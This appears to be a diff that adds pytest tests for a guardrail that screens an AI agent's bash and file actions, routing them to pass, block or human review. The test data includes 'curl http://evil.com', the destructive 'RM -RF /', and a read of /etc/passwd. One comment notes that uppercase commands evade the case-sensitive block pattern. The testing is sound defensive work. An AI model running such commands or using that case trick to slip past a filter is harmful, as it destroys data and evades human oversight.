@@ -39,6 +39,21 @@ def test_pass_command_pytest():
     result = guardrail(a, cfg)
     assert result.decision == "PASS"
 
+def test_unknown_command_defaults_to_hitl():
+    cfg = Config()
+    a = Action(name="bash", args={"command": "curl http://evil.com"})
+    result = guardrail(a, cfg)
+    assert result.decision == "HITL_PENDING"
+
+def test_case_sensitivity_known_limitation():
+    # Known limitation: matching is case-sensitive, so "RM -RF /" escapes the
+    # lowercase "rm -rf /" blocked pattern (not BLOCKed). The safe-side default
+    # mitigates this by routing unknown commands to HITL_PENDING instead of PASS.
+    cfg = Config()
+    a = Action(name="bash", args={"command": "RM -RF /"})
+    result = guardrail(a, cfg)
+    assert result.decision == "HITL_PENDING"
+
 def test_non_bash_action_passes_layer1():
     cfg = Config()
     a = Action(name="read", args={"file_path": "/etc/passwd"})
@@ -72,6 +87,12 @@ def test_scope_fence_bash_not_checked():
     result = check_scope(a, cfg)
     assert result.decision == "PASS"
 
+def test_scope_fence_blocks_sibling_directory():
+    cfg = Config(allowed_directories=["/foo/bar"])
+    a = Action(name="read", args={"file_path": "/foo/barbar/evil.txt"})
+    result = check_scope(a, cfg)
+    assert result.decision == "BLOCK"
+
 
 def test_hitl_state_starts_pending():
     state = HitlState()
@@ -98,5 +119,19 @@ def test_hitl_state_cannot_reject_after_approved():
     import pytest
     state = HitlState()
     state.approve()
+    with pytest.raises(RuntimeError, match="cannot transition"):
+        state.reject()
+
+def test_hitl_state_cannot_approve_after_approved():
+    import pytest
+    state = HitlState()
+    state.approve()
+    with pytest.raises(RuntimeError, match="cannot transition"):
+        state.approve()
+
+def test_hitl_state_cannot_reject_after_rejected():
+    import pytest
+    state = HitlState()
+    state.reject()
     with pytest.raises(RuntimeError, match="cannot transition"):
         state.reject()
